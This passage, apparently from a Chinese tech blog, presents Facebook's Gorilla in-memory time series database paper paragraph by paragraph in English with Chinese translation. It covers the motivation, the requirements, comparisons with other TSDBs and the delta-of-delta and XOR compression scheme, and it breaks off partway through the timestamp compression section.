        <content type="html"><![CDATA[<div><p><a href="http://www.vldb.org/pvldb/vol8/p1816-teller.pdf?spm=a2c6h.12873639.article-detail.7.69e9446b9wFFAw&file=p1816-teller.pdf">《Gorilla: A Fast, Scalable, In-Memory Time Series Database》</a> 这篇论文讲述了 <code>Facebook</code> 在存储时序数据模型时的一些实践，重点讲述了他们内部的一款内存型的时序数据库 <code>Gorilla</code>。论文中通过使用 <code>Delta-Of-Delta</code> 和 <code>XOR</code> 方式分别对时序数据的时间戳以及浮点数据进行压缩编码，极大的节省了时序数据的存储开销，这也成为了业界时序数据库主流的数据编码压缩方式。这篇论文是时序数据库领域必读的一篇文章。</p></div><div><p><img src="/assets/images/gorilla-notes.jpg" alt="网友记录的Gorilla笔记图" loading="lazy"></p></div><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Large-scale internet services aim to remain highly available and responsive in the presence of unexpected failures. Providing this service often requires monitoring and analyzing tens of millions of measurements per second across a large number of systems, and one particularly effective solution is to store and query such measurements in a time series database (TSDB).</p><p>大型的互联网服务通常能够在出现意外故障时仍能保持高可用性和响应能力。 为了提供这种服务，通常需要时刻监控和分析系统中大量数据，一种特别高效的解决方案就是使用时序数据库 （TSDB） 对这些数据进行存储和查询。</p><p>A key challenge in the design of TSDBs is how to strike the right balance between efficiency, scalability, and reliability. In this paper we introduce Gorilla, Facebook’s inmemory TSDB. Our insight is that users of monitoring systems do not place much emphasis on individual data points but rather on aggregate analysis, and recent data points are of much higher value than older points to quickly detect and diagnose the root cause of an ongoing problem. Gorilla optimizes for remaining highly available for writes and reads, even in the face of failures, at the expense of possibly dropping small amounts of data on the write path. To improve query efficiency, we aggressively leverage compression techniques such as delta-of-delta timestamps and XOR’d floating point values to reduce Gorilla’s storage footprint by 10x.</p><p>时序数据库（TSDB）设计中的一个关键挑战是如何权衡效率、可扩展性以及可靠性。 在本文中，我们介绍了一款 Facebook 的内存型时序数据库（TSDB） - <code>Gorilla</code>。 我们认为对监控系统来说，相比于某一个数据点，用户更加重视于数据的聚合分析，并且在快速检测和诊断一个正在发生的问题时，新数据的价值通常会远远大于老数据。Gorilla 针对于高可用的读写进行了一些优化，当出现故障时可以通过牺牲少量的写数据来保障服务的整体可用性。为了提高查询效率，我们专门使用了一些压缩技术，例如使用 <code>Delta-Of-Delta</code> 来编码时间戳，使用 <code>XOR</code> 来编码浮点值，通过这种方式，我们将 Gorilla 的存储空间减少 10 倍左右。</p><p>This allows us to store Gorilla’s data in memory, reducing query latency by 73x and improving query throughput by 14x when compared to a traditional database (HBase) backed time series data. This performance improvement has unlocked new monitoring and debugging tools, such as time series correlation search and more dense visualization tools. Gorilla also gracefully handles failures from a single-node to entire regions with little to no operational overhead.</p><p>这使得我们能够将 Gorilla 的数据存储在内存中，相比于传统的时序数据库（HBase），查询延迟减少了 73 倍，查询吞吐量提高了 14 倍。 性能的提升解锁了新的监控和调试工具，例如时间序列关联搜索，更密集的可视化工具。 Gorilla 还可以优雅地应对单个节点到整个区域的故障，并且不会有额外的运维开销。</p><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Large-scale internet services aim to remain highly-available and responsive for their users even in the presence of unexpected failures. As these services have grown to support a global audience, they have scaled beyond a few systems running on hundreds of machines to thousands of individual systems running on many thousands of machines, often across multiple geo-replicated datacenters.</p><p>大型的互联网服务的目标是保持高可用，即使在故障的情况下也应该能够响应用户的请求。随着服务的发展，为了支持庞大的全球客户，需要将之前在数百台机器上运行的几个系统扩展到在数千台机器上运行的数千个单独的系统，它们通常还要跨越不同地域的数据中心。</p><div><p><img src="/assets/images/gorilla-cn-1.png" alt="图 1" loading="lazy"></p></div><p>Figure 1: High level overview of the ODS monitoring and alerting system, showing Gorilla as a writethrough cache of the most recent 26 hours of time series data.</p><p>图 1：ODS 监控和警报系统的高级概述（预览），展示了 Gorilla 作为直写缓存（五种缓存策略中的其中一种）的最近 26 小时的时序数据。</p><p>An important requirement to operating these large scale services is to accurately monitor the health and performance of the underlying system and quickly identify and diagnose problems as they arise. Facebook uses a time series database (TSDB) to store system measuring data points and provides quick query functionalities on top. We next specify some of the constraints that we need to satisy for monitoring and operating Facebook and then describe Gorilla, our new inmemory TSDB that can store tens of millions of datapoints (e.g., CPU load, error rate, latency etc.) every second and respond queries over this data within milliseconds.</p><p>操作这些大型服务的一个重要需求就是要能够准确的监控底层系统的运行状况和性能，并在出现问题时能够快速的识别和诊断。 Facebook 使用时序数据库 （TSDB） 来存储系统的测量数据，并在上层提供了快速查询的功能。 后来我们在监控和运维 Facebook 时遇到了一些限制（约束），于是我们设计了 Gorilla，这是一个新的内存型时序数据库（TSDB），它每秒可以存储数千万个数据点（例如，CPU 负载、错误率、延迟等），并且能够实现毫秒级的数据查询。</p><p><strong>Writes dominate.</strong> Our primary requirement for a TSDB is that it should always be available to take writes. As we have hundreds of systems exposing multiple data items, the write rate might easily exceed tens of millions of data points each second. In constrast, the read rate is usually a couple orders of magnitude lower as it is primarily from automated systems watching ’important’ time series, data visualization systems presenting dashboards for human consumption, or from human operators wishing to diagnose an observed problem.</p><p><strong>大量（主导地位）的写入。</strong> 我们对于时序数据库（TSDB）的主要需求是它应该始终可以接受写操作。由于我们有数百个暴露了众多的数据项的系统，因此可能很容易就会超过每秒数千万的写入速率。 相比之下，读取的速率通常要低好几个数量级，读取主要来自于观测 “重要” 时序数据的自动化系统，供人使用的数据可视化仪表盘，诊断线上问题时的人为操作。</p><p><strong>State transitions.</strong> We wish to identify issues that emerge from a new software release, an unexpected side effect of a configuration change, a network cut and other issues that result in a significant state transition. Thus, we wish for our TSDB to support fine-grained aggregations over short-time windows. The ability to display state transitions within tens of seconds is particularly prized as it allows automation to quickly remediate problems before they become wide spread.</p><p><strong>状态转换。</strong> 我们希望找出新软件发布中出现的问题，配置更改导致的副作用，网络中断 和 其他导致重大的状态转变的问题。 因此，我们希望我们的时序数据库 （TSDB） 能够支持在很短的时间窗口内实现细粒度的聚合计算。这种在几十秒内能够迅速检测到系统状态发生变化的能力是非常有价值的，因为（基于）它就可以在故障扩散之前进行自动化的修复。</p><p><strong>High availability.</strong> Even if a network partition or other failure leads to disconnection between different datacenters, systems operating within any given datacenter ought to be able to write data to local TSDB machines and be able to retrieve this data on demand.</p><p><strong>高可用性。</strong> 即使网络分区或其他故障导致不同数据中心之间断开连接，任何数据中心都应该能够将数据写入本地的时序数据库（TSDB）机器中，并能够按需查询这些数据。</p><p><strong>Fault tolerance.</strong> We wish to replicate all writes to multiple regions so we can survive the loss of any given datacenter or geographic region due to a disaster.</p><p><strong>容错。</strong> 我们希望将所有的写操作复制到多个区域中，这样我们就可以容忍任何数据中心或不同地域的节点发生故障（灾难）。</p><p>Gorilla is Facebook’s new TSDB that satisfies these constraints. Gorilla functions as a write-through cache of the most recent data entering the monitoring system. We aim to ensure that most queries run within 10’s of milliseconds.</p><p>Gorilla 是 Facebook 研发的新型时序数据库 （TSDB），它满足了这些约束（限制）。 Gorilla 使用直写缓存（Write-Through Cache）的方式来记录写入监控系统的最新数据。 我们的目标是确保大多数查询在 10 毫秒内完成。</p><p>The insight in Gorilla’s design is that users of monitoring systems do not place much emphasis on individual data points but rather on aggregate analysis. Additionally, these systems do not store any user data so traditional ACID guarantees are not a core requirement for TSDBs. However, a high percentage of writes must succeed at all times, even in the face of disasters that might render entire datacenters unreachable. Additionally, recent data points are of higher value than older points given the intuition that knowing if a particular system or service is broken right now is more valuable to an operations engineer than knowing if it was broken an hour ago. Gorilla optimizes for remaining highly available for writes and reads, even in the face of failures, at the expense of possibly dropping small amounts of data on the write path.</p><p>Gorilla 独特的设计点在于，用户在使用监控系统时通常不会重视单独的一个数据点，而是更在意整体的数据聚合分析。此外，这些系统不会存储任何用户数据，因此传统的 ACID 特性并不是时序数据库（TSDB） 的核心需求。但是，即使在面对可能导致整个数据中心都无法访问的灾难时，大部分的写操作也必须始终执行成功。此外，最近的数据点要比旧的数据点更有价值，通常对于运维工程师来说，了解一个特定的系统或者服务现在是否存在故障比知道之前它一个小时前是否存在故障更有价值。Gorilla 对于读写的可用性也做了一些优化，即使在出现故障时，也只会在仅仅丢失少量的数据的同时来保证整体的可用性。</p><p>The challenge then arises from high data insertion rate, total data quantity, real-time aggregation, and reliability requirements. We addressed each of these in turn. To address the first couple requirements, we analyzed the Operational Data Store (ODS) TSDB, an older monitoring system that was widely used at Facebook. We noticed that at least 85% of all queries to ODS was for data collected in the past 26 hours. Further analysis allowed us to determine that we might be able to serve our users best if we could replace a disk-based database with an in-memory database. Further, by treating this in-memory database as a cache of the persistent disk-based store, we could achieve the insertion speed of an in-memory system with the persistence of a disk based database.</p><p>挑战主要来自于高性能的写入、数据总量、实时聚合和可靠性的要求。我们依次地解决了这些问题。为了解决前两个需求，我们分析了操作数据存储 （ODS）时序数据库（TSDB），这是一个在 Facebook 上广泛使用的比较老的监控系统。我们注意到，对 ODS 的所有查询中，至少有 85% 的查询是访问过去 26 小时内收集的数据。进一步的分析使我们能够确定，如果我们能够用一个内存数据库代替基于磁盘的数据库，我们也许能够为用户提供最好的服务。此外，通过将这个内存数据库视为基于磁盘的持久存储的缓存，我们可以在基于磁盘的数据库持久存储的情况下实现内存系统的插入速度。</p><p>As of Spring 2015, Facebook’s monitoring systems generate more than 2 billion unique time series of counters, with about 12 million data points added per second. This represents over 1 trillion points per day. At 16 bytes per point, the resulting 16TB of RAM would be too resource intensive for practical deployment. We addressed this by repurposing an existing XOR based floating point compression scheme to work in a streaming manner that allows us to compress time series to an average of 1.37 bytes per point, a 12x reduction in size.</p><p>截至到 2015 年春季，Facebook 的监控系统产生了超过 20 亿个唯一的时间序列计数器，每秒增加大约1200万个数据点。这意味着每天会增加超过 1 万亿个数据点。假设每个数据点占用 16字节，每天就需要 16TB 的内存空间，这对于实际的部署而言是巨大的资源消耗。我们通过重用现有的基于异或（XOR）的浮点数压缩方案来解决这个问题，该方案以流的方式工作，允许我们将时间序列压缩到平均每个点 1.37 字节，大小减少了 12 倍。</p><p>We addressed the reliability requirements by running multiple instances of Gorilla in different datacenter regions and streaming data to each without attempting to guarantee consistency. Read queries are directed at the closest available Gorilla instance. Note that this design leverages our observation that individual data points can be lost without compromising data aggregation unless there’s significant discrepancy between the Gorilla instances.</p><p>我们通过在不同的数据中心区域运行 Gorilla 的多个实例并向每个实例传输数据来满足可靠性需求，但不会试图去保证一致性。读查询会直接路由到最近的可用 Gorilla 实例上。请注意，这种设计基于我们的所见所闻，即单个数据点的丢失并不会影响数据聚合，除非 Gorilla 实例之间存在显著差异。</p><p>Gorilla is currently running in production at Facebook and is used daily by engineers for real-time firefighting and debugging in conjunction with other monitoring and analysis systems like Hive [27] and Scuba [3] to detect and diagnose problems.</p><p>Gorilla 目前部署在 Facebook 的生产环境中，工程师们把它当做日常的实时数据工具，并协同其它监控和分析系统（例如Hive、Scuba）一起检测和诊断问题。</p><h2 id="2、背景和要求"><a href="#2、背景和要求" class="headerlink" title="2、背景和要求"></a>2、背景和要求</h2><h3 id="2-1、操作数据存储（ODS）"><a href="#2-1、操作数据存储（ODS）" class="headerlink" title="2.1、操作数据存储（ODS）"></a>2.1、操作数据存储（ODS）</h3><p>Operating and managing Facebook’s large infrastructure comprised of hundreds of systems distributed across multiple data centers would be very difficult without a monitoring system that can track their health and performance. The Operational Data Store (ODS) is an important portion of the monitoring system at Facebook. ODS comprises of a time series database (TSDB), a query service, and a detection and alerting system. ODS’s TSDB is built atop the HBase storage system as described in [26]. Figure 1 represents a high-level view of how ODS is organized. Time series data from services running on Facebook hosts is collected by the ODS write service and written to HBase.</p><p>如果没有可以跟踪其健康状况和性能的监控系统，运营和管理分布在多个数据中心的数百个系统的 Facebook 大型基础设施将会变得非常困难。操作数据存储（ODS）是 Facebook 监控系统的重要组成部分。ODS 由时间序列数据库 （TSDB）、查询服务和检测警报系统组成。 ODS 的 TSDB 构建在 HBase 存储系统之上，如 [26] 中所述。 图 1 展示了 ODS 组织方式的高级视图。 来自 Facebook 主机上运行的服务的时间序列数据由 ODS 写入服务收集并写入 HBase。</p><p>There are two consumers of ODS time series data. The first consumers are engineers who rely on a charting system that generates graphs and other visual representations of time series data from ODS for interactive analysis. The second consumer is our automated alerting system that read counters off ODS, compares them to preset thresholds for health, performance and diagnostic metrics and fires alarms to oncall engineers and automated remediation systems.</p><p>ODS 时间序列数据有两个消费者。 第一个消费者是工程师，他们依赖图表系统从 ODS 生成图形和其他时间序列数据的可视化表示，以便于进行交互式分析。 第二个消费者是我们的自动警报系统，它可以读取 ODS 的计数器，将它们与预设的健康、性能和诊断指标阈值进行比较，并向值班（oncall）工程师和自动修复系统发出警报。</p><h4 id="2-1-1、监控系统读取性能问题"><a href="#2-1-1、监控系统读取性能问题" class="headerlink" title="2.1.1、监控系统读取性能问题"></a>2.1.1、监控系统读取性能问题</h4><p>In early 2013, Facebook’s monitoring team realized that its HBase time series storage system couldn’t scale handle future read loads. While the average read latency was acceptable for interactive charts, the 90th percentile query time had increased to multiple seconds blocking our automation. Additionally, users were self-censoring their usage as interactive analysis of even medium-sized queries of a few thousand time series took tens of seconds to execute. Larger queries executing over sparse datasets would timeout as the HBase data store was tuned to prioritize writes. While our HBase-based TSDB was inefficient, we quickly rejected wholesale replacement of the storage system as ODS’s HBase store held about 2 PB of data [5]. Facebook’s data warehouse solution, Hive, was also unsuitable due to its already orders of magnitude higher query latency comparing to ODS, and query latency and efficiency were our main concerns [27].</p><p>2013 年初，Facebook 的监控团队意识到其 HBase 时间序列存储系统无法进行扩展来支撑未来的读取负载。 虽然交互式图表的平均读取延迟是可以接受的，但 90% 的查询时间已经到达到数秒，这阻碍了我们的自动化。 此外，用户对自己的使用情况会进行自我审查，即使是对几千个时间序列的中型查询的交互式分析也需要数十秒才能执行完成。 由于 HBase 数据存储已调整为写优先，在稀疏数据集上执行的较大查询将超时。虽然我们基于 HBase 的 TSDB 效率低下，但我们很快就拒绝了存储系统的大规模更换，因为 ODS 的 HBase 存储拥有大约 2 PB 的数据 [5]。 Facebook 的数据仓库解决方案 Hive 也不适合，因为它的查询延迟比 ODS 高出了几个数量级，而查询延迟和效率又是我们主要关心的问题 [27]。</p><p>We next turned our attention to in-memory caching. ODS already used a simple read-through cache but it was primarily targeted at charting systems where multiple dashboards shared the same time series. A particularly difficult scenario was when dashboards queried for the most recent data point, missed in the cache, and then issued requests directly to the HBase data store. We also considered a separate Memcache [20] based write-through cache but rejected it as appending new data to an existing time series would require a read&#x2F;write cycle, causing extremely high traffic to the memcache server. We needed a more efficient solution.</p><p>接下来我们将注意力转向了内存缓存。 ODS 已经使用了一个简单的直读缓存，但它主要针对多个仪表板共享相同时间序列的图表系统。 一个特别困难的场景是当仪表板查询最近的数据点时，如果缓存中不存在，它将直接向 HBase 数据存储发出请求。 我们还考虑了一个单独的基于 Memcache [20] 的直写缓存，但最后被否决了，因为将新数据追加到现有的时间序列将需要一个读&#x2F;写周期，从而导致 Memcache 服务器的流量非常大。 我们需要一个更有效的解决方案。</p><h3 id="2-2、Gorilla的需求"><a href="#2-2、Gorilla的需求" class="headerlink" title="2.2、Gorilla的需求"></a>2.2、Gorilla的需求</h3><p>With these considerations, we determined the following requirements for a new service:</p><p>考虑到这些因素，我们确定了新服务的以下要求（需要满足）：</p><ul><li>2 billion unique time series identified by a string key.</li><li>700 million data points (time stamp and value) added per minute.</li><li>Store data for 26 hours.</li><li>More than 40,000 queries per second at peak.</li><li>Reads succeed in under one millisecond.</li><li>Support time series with 15 second granularity (4 points per minute per time series).</li><li>Two in-memory, not co-located replicas (for disaster recovery capacity).</li><li>Always serve reads even when a single server crashes.</li><li>Ability to quickly scan over all in memory data.</li><li>Support at least 2x growth per year.</li></ul><br /><ul><li>20 亿个由字符串键标识的唯一时间序列；</li><li>每分钟添加 7 亿个数据点（时间戳和值）；</li><li>存储数据 26 小时；</li><li>峰值时每秒超过 40,000 个查询；</li><li>在一毫秒内读取成功；</li><li>支持 15 秒粒度的时间序列（每个时间序列每分钟 4 个点）；</li><li>两个内存中的非共存副本（用于灾难恢复能力）；</li><li>即使单个服务器崩溃，也始终提供读取服务；</li><li>能够快速扫描所有内存数据；</li><li>支持每年至少 2 倍的增长；</li></ul><p>After a brief comparison with other TSDB systems in Section 3, we detail the implementation of Gorilla in Section 4, first discussing its new time stamp and data value compression schemes in Section 4.1. We then describe how Gorilla remains highly available despite single node failures and region-wide disasters in Section 4.4. We describe how Gorilla has enabled new tools in Section 5. We close out by describing our experience developing and deploying Gorilla in Section 6.</p><p>在第 3 节与其他 TSDB 系统进行了简要比较之后，我们在第 4 节详细介绍了 Gorilla 的实现，首先在第 4.1 节讨论了其新的时间戳和数据值压缩方案。 然后，我们将在 4.4 节中描述 Gorilla 如何在单节点故障和区域范围内发生灾难的情况下保持高可用性。 我们将在第 5 节中描述 Gorilla 如何启用新工具。最后我们在第 6 节中描述我们开发和部署 Gorilla 的经验。</p><h2 id="3、与-TSDB-系统的比较"><a href="#3、与-TSDB-系统的比较" class="headerlink" title="3、与 TSDB 系统的比较"></a>3、与 TSDB 系统的比较</h2><p>There are a number of publications detailing data mining techniques to search, classify, and cluster enormous amounts of time series data efficiently [8, 23, 24]. These systems demonstrate many of the uses of examining time series data, from clustering and classifying [8, 23] to anomaly detection [10, 16] to indexing the time series [9, 12, 24]. However, there are fewer examples detailing systems able to gather and store massive amounts of time series data in real-time. Gorilla’s design, focusing on reliable real-time monitoring of production systems, makes stand out compared to other TSDBs. Gorilla occupies an interesting design space, where being available for reads and writes in the face of failures prioritized over availability of any older data.</p><p>有很多出版物详细介绍了通过数据挖掘技术来进行搜索、分类和高效聚合大量的时间序列数据 [8, 23, 24]。这些系统描述了研究时间序列数据的许多用途，从聚类和分类 [8, 23] 到异常检测 [10, 16] 到索引时间序列 [9, 12, 24]。但是，很少有能够进行实时收集和存储大量时间序列数据的系统的详细示例。 Gorilla 的设计专注于对生产系统进行可靠的实时监控，在与其他 TSDB 的比较中脱颖而出。Gorilla 有一个有趣的设计：当出现故障时仍然可以进行读取和写入，该优先级高于任何旧数据的可用性。</p><p>Since Gorilla was designed from the beginning to store all data in memory, its in-memory structure is also different from existing TSDBs. However, if one views Gorilla as an intermediate store for in-memory storage of time series data in front of another on-disk TSDB, then Gorilla could be used as a write through cache for any TSDB (with relatively simple modifications). Gorilla’s focus on speed of ingest and horizontal scaling is similar to existing solutions.</p><p>由于 Gorilla 从一开始的设计初衷就是将数据存储在内存中，因此它的内存结构不同于现有的 TSDB。 但是，如果将 Gorilla 看作一个中间存储，用来在基于磁盘的 TSDB 的上层的内存中存储时间序列数据，那么 Gorilla 可以通过相对简单的修改来用作任何 TSDB 的直写缓存（Write-Through Cache）。Gorilla 对摄取速度和水平扩展的关注与现有解决的方案类似。</p><h3 id="3-1、OpenTSDB"><a href="#3-1、OpenTSDB" class="headerlink" title="3.1、OpenTSDB"></a>3.1、OpenTSDB</h3><p>OpenTSDB is based on HBase [28], and very closely resembles the ODS HBase storage layer we use for long term data. Both systems rely on similar table structures, and have come to similar conclusions for optimization and horizontal scalability [26, 28]. However, we had found that supporting the volume of queries necessary to build advanced monitoring tools required faster queries than a disk based store can support.</p><p>OpenTSDB 基于 HBase [28]，它和用于存储长期数据的 ODS HBase 存储层非常相似。 两个系统都拥有相似的表结构，并且在优化和水平扩展性方面都有着相似的结论 [26, 28]。 但是，我们发现为了支持构建高级监控工具的大量查询，我们需要比基于磁盘的存储所能支持的更快的查询。</p><p>Unlike OpenTSDB, the ODS HBase layer does do time roll up aggregation for older data to save space. This results in older, archived data having lower time granularity compared to more recent data in ODS, while OpenTSDB will keep the full resolution data forever. We have found that cheaper long time period queries and space savings are worth the loss of precision.</p><p>不同于 OpenTSDB ，ODS HBase 存储层会定期的对老数据进行聚合以节省空间。这导致 ODS 中的老数据相比于新数据的时间间隔粒度更大，而 OpenTSDB 永远保留完整分辨率的数据。 我们发现从成本较低的长时间片查询以及空间的节省上来说，数据精度的丢失是可以接受的。</p><p>OpenTSDB also has a richer data model for identifying time series. Each time series is identified by a set of arbitrary key-value pairs, called tags [28]. Gorilla identifies time series with a single string key and relies on higher level tools to extract and identify time series meta data.</p><p>OpenTSDB 还有更丰富的数据模型来识别时间序列。 每个时间序列由一组任意键值对标识，称为标签 [28]。 Gorilla 使用单个字符串键识别时间序列，并依赖更高级别的工具来提取和识别时间序列元数据。</p><h3 id="3-2、Whisper-Graphite"><a href="#3-2、Whisper-Graphite" class="headerlink" title="3.2、Whisper (Graphite)"></a>3.2、Whisper (Graphite)</h3><p>Graphite stores time series data on local disk in the Whisper format, a Round Robin Database (RRD) style database [1]. This file format expects time series data to be timestamped at regular intervals, and does not support jitter in the time series. While Gorilla does work more efficiently if data are timestamped at regular intervals, it can handle arbitrary and changing intervals. With Whisper, each time series is stored in a separate file, and new samples overwrite old ones after a certain amount of time [1]. Gorilla works in a similar fashion, only holding the most recent day of data in memory. However, with its focus on on-disk storage, query latency using Graphite&#x2F;Whisper is not fast enough to match the requirements for Gorilla.</p><p>Graphite 将时间序列数据以 Whisper 格式存储在本地磁盘上，这是一种循环数据库 (RRD) 风格的数据库 [1]。 这种文件格式要求时间序列数据是按照固定的时间间隔产生的，不支持间隔跳动的时间序列。 如果数据时间戳的时间间隔固定，Gorilla 确实可以更有效地工作，但它也支持处理任意和不断变化的时间间隔。 使用 Whisper，每个时间序列都存储在一个单独的文件中，并且新样本数据会在一定时间后覆盖旧样本数据 [1]。 Gorilla 以类似的方式工作，只在内存中保存最近一天的数据。 然而，由于 Graphite&#x2F;Whisper 专注于磁盘存储，因此它的查询延迟无法满足 Gorilla 的要求。</p><h3 id="3-3、InfluxDB"><a href="#3-3、InfluxDB" class="headerlink" title="3.3、InfluxDB"></a>3.3、InfluxDB</h3><p>InfluxDB is a new open-source time series database, with an even richer data model than OpenTSDB. Each event in a time series can have a full set of meta data. While this flexibility does allow for rich data, it necessarily results in larger disk usage than schemes that only store time series within the database [2].</p><p>InfluxDB 是一个全新的开源时序数据库，其数据模型比 OpenTSDB 更加丰富。 时间序列中的每个事件都可以拥有一整套元数据。 虽然这种灵活性允许其使用丰富的数据，但是相比于仅在数据库中存储时间序列的方案来说，它必然会导致更大的磁盘使用量 [2]。</p><p>InfluxDB also contains the code to build it as a distributed storage cluster, allowing users to scale horizontally without the overhead of managing an HBase&#x2F;Hadoop cluster [2]. At Facebook, we already have dedicated teams to support our HBase installations, so using it for ODS did not involve a large extra investment in resources. Like other systems, InfluxDB keeps data on-disk, leading to slower queries than if data are kept in memory.</p><p>InfluxDB 还包含一些支持构建为分布式存储集群的代码，它允许用户水平扩展而无需管理 HBase&#x2F;Hadoop 集群 [2]。 在 Facebook，我们已经有专门的团队来支持 HBase 的安装，因此将其用于 ODS 并不需要大量额外的资源投资。 与其他系统一样，InfluxDB 将数据保存在磁盘上，导致查询速度相比将数据保存在内存中要慢。</p><h2 id="4、Gorilla架构"><a href="#4、Gorilla架构" class="headerlink" title="4、Gorilla架构"></a>4、Gorilla架构</h2><p>Gorilla is an in-memory TSDB that functions as a writethrough cache for monitoring data written to an HBase data store. The monitoring data stored in Gorilla is a simple 3- tuple of a string key, a 64 bit time stamp integer and a double precision floating point value. Gorilla incorporates a new time series compression algorithm that allows us to compress each by series down from 16 bytes to an average of 1.37 bytes, a 12x reduction in size. Further, we have arranged Gorilla’s in-memory data structures to allow fast and efficient scans of all data while maintaining constant time lookup of individual time series.</p><p>Gorilla 是一个基于内存的 TSDB，在监控数据写入 HBase 数据存储时，起到直写缓存（Write-Through Cache）的作用。 Gorilla 中存储的监控数据是一个简单的三元组：字符串键、64 位时间戳整数和双精度浮点值。 Gorilla 采用了一种新的时间序列压缩算法，允许我们将每个序列从 16 个字节压缩到平均 1.37 个字节，大小减少了 12 倍。 此外，我们设计了 Gorilla 的内存数据结构，在保持对单个时间序列查找时间恒定的同时，也能够快速高效的进行全数据扫描。</p><div><p><img src="/assets/images/gorilla-cn-2.png" alt="图 2" loading="lazy"></p></div><p>Figure 2: Visualizing the entire compression algorithm. For this example, 48 bytes of values and time stamps<br>are compressed to just under 21 bytes&#x2F;167 bits.</p><p>图 2：可视化整个压缩算法。 对于此示例，48 字节的值和时间戳被压缩到略低于 21 字节（大约167 位）。</p><p>The key specified in the monitoring data is used to uniquely identify a time series. By sharding all monitoring data based on these unique string keys, each time series dataset can be mapped to a single Gorilla host. Thus, we can scale Gorilla by simply adding new hosts and tuning the sharding function to map new time series data to the expanded set of hosts. When Gorilla was launched to production 18 months ago, our dataset of all time series data inserted in the past 26 hours fit into 1.3TB of RAM evenly distributed across 20 machines. Since then, we have had to double the size of the clusters twice due to data growth, and are now running on 80 machines within each Gorilla cluster. This process was simple due to the share-nothing architecture and focus on horizontal scalability.</p><p>监控数据中指定的键用于唯一标识一个时间序列。 通过使用这些唯一的字符串键来对所有的监控数据进行分片，每个时间序列数据集都可以映射到单个 Gorilla 主机。因此，我们可以通过简单地添加新主机并调整分片算法来将新的时间序列数据映射到新的主机上，从而实现扩展 Gorilla 的目的。 当 Gorilla 在 18 个月前投入生产时，我们在过去 26 小时内插入的所有时间序列数据的数据集均匀分布在 20 台机器上的 1.3TB 内存中。 在那之后，由于数据的增长，我们不得不将集群规模翻倍，现在每个 Gorilla 集群运行在 80 台机器上。 由于无共享（Share-Nothing）架构和专注于水平的可扩展性，这个扩展的过程相当简单。</p><p>Gorilla tolerates single node failures, network cuts, and entire datacenter failures by writing each time series value to two hosts in separate geographic regions. On detecting a failure, all read queries are failed over to the alternate region ensuring that users do not experience any disruption.</p><p>Gorilla 通过将每个时间序列值写入不同地域的两台主机中来容忍单节点故障，网络中断，甚至于整个数据中心故障。 检测到故障时，所有读取操作都将故障转移到备用区域，确保用户不会感知任何中断。</p><h3 id="4-1、时序压缩"><a href="#4-1、时序压缩" class="headerlink" title="4.1、时序压缩"></a>4.1、时序压缩</h3><p>In evaluating the feasibility of building an in-memory time series database, we considered several existing compression schemes to reduce the storage overhead. We identified techniques that applied solely to integer data which didn’t meet our requirement of storing double precision floating point values. Other techniques operated on a complete dataset but did not support compression over a stream of data as was stored in Gorilla [7, 13]. We also identified lossy time series approximation techniques used in data mining to make the problem set more easily fit within memory [15, 11], but Gorilla is focused on keeping the full resolution representation of data.</p><p>在评估构建内存时间序列数据库的可行性时，我们考虑了几种现有的压缩方案来降低存储开销。 我们确定了仅适用于整数数据的技术，这些技术不符合我们存储双精度浮点值的要求。 其他技术在完整数据集上运行，但不支持对存储在 Gorilla [7, 13] 中的数据流进行压缩。 我们还确定了数据挖掘中使用的有损的时间序列近似技术（Lossy Time Series Approximation Techniques），尝试使其更适合用内存来存储 [15, 11]，但 Gorilla 专注于保持数据的完整性。</p><p>Our work was inspired by a compression scheme for floating point data derived in scientific computation. This scheme leveraged XOR comparison with previous values to generate a delta encoding [25, 17].</p><p>我们受到了科学计算中浮点数据压缩方案的启发。 该方案利用与先前值的 XOR 比较来生成差值编码 [25, 17]。</p><p>Gorilla compresses data points within a time series with no additional compression used across time series. Each data point is a pair of 64 bit values representing the time stamp and value at that time. Timestamps and values are compressed separately using information about previous values. The overall compression scheme is visualized in Figure 2, showing how time stamps and values are interleaved in the compressed block.</p><p>Gorilla 只对一个时间序列中的数据点进行压缩，不会有跨时间序列压缩。每个数据点是一对 64 位值，表示当时的时间戳和值。时间戳和值根据先前的值分别进行压缩。整体的压缩方案如图 2 所示，图中展示了时间戳和值是如何在压缩块中交错分布的。</p><p>Figure 2.a illustrates the time series data as a stream consisting of pairs of measurements (values) and time stamps. Gorilla compresses this data stream into blocks, partitioned by time. After a simple header with an aligned time stamp (starting at 2 am, in this example) and storing the first value in a less compressed format, Figure 2.b shows that timestamps are compressed using delta-of-delta compression, described in more detail in Section 4.1.1. As shown in Figure 2.b the time stamp delta of delta is −2. This is stored with a two bit header (‘10’), and the value is stored in seven bits, for a total size of just 9 bits. Figure 2.c shows floating-point values are compressed using XOR compression, described in more detail in Section 4.1.2. By XORing the floating point value with the previous value, we find that there is only a single meaningful bit in the XOR. This is then encoded with a two bit header (‘11’), encoding that there are eleven leading zeros, a single meaningful bit, and the actual value (‘1’). This is stored in fourteen total bits.</p><p>图 2.a 表明时间序列数据是由成对的时间戳和测量值组成的数据流。 Gorilla 按照时间分区将数据流压缩到数据块中。这里先定义了一个由基线时间构成的 Header （图例中从 2 点开始），然后将第一个值进行了简单的压缩并存储，图 2.b 显示了时间戳的压缩方式为 delta-of-delta ，这个在第 4.1.1 节由更详细的描述。如图 2.b 所示，时间戳 delta-of-delta 的值为 -2 ，我们使用 2 位来存储 Header （’10’），并且之后使用 7 位来存储该值，总大小只有 9 位。图 2.c 显示了浮点值的压缩方式为 XOR，这个在第 4.1.2 节由更详细的描述。通过将浮点值与前一个值进行异或（XOR）计算，我们发现最后只有 1 个有意义的位，然后使用 2 位来编码 Header（’11’），编码中有 11 个前导零（Leading Zero），1 个有意义的位和实际值（’1’），总大小为 14 位。</p><div><p><img src="/assets/images/gorilla-cn-3.png" alt="图 3" loading="lazy"></p></div><p>Figure 3: Distribution of time stamp compression across different ranged buckets. Taken from a sample of 440, 000 real time stamps in Gorilla.</p><p>图 3：不同范围存储桶的时间戳压缩分布。 来自于 Gorilla 中 440, 000 个实时时间戳的样本数据。</p><h4 id="4-1-1、-时间戳压缩"><a href="#4-1-1、-时间戳压缩" class="headerlink" title="4.1.1、 时间戳压缩"></a>4.1.1、 时间戳压缩</h4><p>We analyzed the time series data stored in ODS so we could optimize the compression scheme implemented in Gorilla. We noticed that the vast majority of ODS data points arrived at a fixed interval. For instance, it is common for a time series to log a single point every 60 seconds. Occasionally, the point may have a time stamp that is 1 second early or late, but the window is usually 